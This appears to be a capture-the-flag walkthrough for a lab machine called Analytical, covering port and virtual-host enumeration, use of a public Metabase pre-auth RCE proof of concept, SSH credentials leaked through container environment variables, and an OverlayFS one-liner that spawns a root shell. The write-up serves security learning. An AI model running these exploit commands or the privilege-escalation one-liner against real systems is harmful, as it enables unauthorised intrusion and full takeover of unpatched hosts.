
## Port Scan

```shell
➜  ~ sudo nmap analytical.htb -p1-65535 -sS
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-23 14:07 CET
Nmap scan report for analytical.htb (10.129.229.224)
Host is up (0.040s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
5069/tcp  filtered i-net-2000-npr
10931/tcp filtered unknown
11760/tcp filtered unknown
53473/tcp filtered unknown
59101/tcp filtered unknown
```

This reveals mostly the web server plus a few irrelevant ports.

```shell
➜  ~ sudo nmap -sU --script broadcast-dhcp-discover -p 67,68 analytical.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-24 14:08 CET
Pre-scan script results:
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     Interface: eth0
|     IP Offered: 10.0.2.16
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 10.0.2.2
|     Subnet Mask: 255.255.255.0
|     Router: 10.0.2.2
|     Domain Name Server: 10.0.2.3
|_    IP Address Lease Time: 1d00h00m00s
Nmap scan report for analytical.htb (10.129.229.224)
Host is up (0.041s latency).

PORT   STATE         SERVICE
67/udp closed        dhcps
68/udp open|filtered dhcpc

```

The UDP port scan does not reveal much more.

## Directory Enumeration

```shell
➜  ~ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u analytical.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://analytical.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://analytical.htb/images/]
/css                  (Status: 301) [Size: 178] [--> http://analytical.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://analytical.htb/js/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

The main website at port 80 does not have much to discover.

```shell
➜  ~ gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -u 10.129.229.224 --append-domain --domain analytical.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://10.129.229.224
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: data.analytical.htb Status: 200 [Size: 77858]
Progress: 653911 / 653912 (100.00%)
===============================================================
Finished
===============================================================

```

In VHOST enumeration, we revealed an interesting Virtual Host called `data` that explored, shows a Metabase website. Metabase is a vulnerable software.

## Exploit Metabase

To exlpoit Metabase there is existing code on GitHub: https://github.com/m3m0o/metabase-pre-auth-rce-poc.git but that requires a setup token. 

Luckily the setup token is visible in the HTML code of the page, probably for observability reasons and/or misconfigurations. Taking the token, the Exploit can be executed. 

```shell
python3 main.py -u http://data.analytics.htb -t [setup-token] -c "[command]"
```

Where `command` can be any valid reverse shell, for instance a Python reverse shell. 
## Docker Environment

Once the reverse shell succeeds we are into a Docker container. The username and password for the SSH are leaked in the environment variables so this step is quite straightforward.

```shell
~ $ env
MB_LDAP_BIND_DN=
LANGUAGE=en_US:en
USER=metabase
HOSTNAME=8ab6a13b8ee6
FC_LANG=en-US
SHLVL=4
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
HOME=/home/metabase
OLDPWD=/app
MB_EMAIL_SMTP_PASSWORD=
LC_CTYPE=en_US.UTF-8
JAVA_VERSION=jdk-11.0.19+7
LOGNAME=metabase
_=cd
MB_DB_CONNECTION_URI=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_PASS=
MB_JETTY_HOST=0.0.0.0
META_PASS=An4lytics_ds20223#   #<<<<<<<<<<<<<<<<<<<<<<<< SSH PASSWORD!
LANG=en_US.UTF-8
MB_LDAP_PASSWORD=
SHELL=/bin/sh
MB_EMAIL_SMTP_USERNAME=
MB_DB_USER=
META_USER=metalytics           #<<<<<<<<<<<<<<<<<<<<<     SSH USER!
LC_ALL=en_US.UTF-8
JAVA_HOME=/opt/java/openjdk
PWD=/home/metabase
MB_DB_FILE=//metabase.db/metabase.db

```

Once logged in via ssh we are `metalytics` a user with enough privileges to attempt a privilege escalations and also the user flag in its home directory.
## Privilege Escalation

There is not much to do but noticing that this version of Ubuntu is vulnerable with respect to the famous overlay file system vulnerability. This one liner taken online will make it.

```shell
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("sh")'

```

This opens a root reverse shell and allows privilege escalation and retrieving the flag from the root home. 

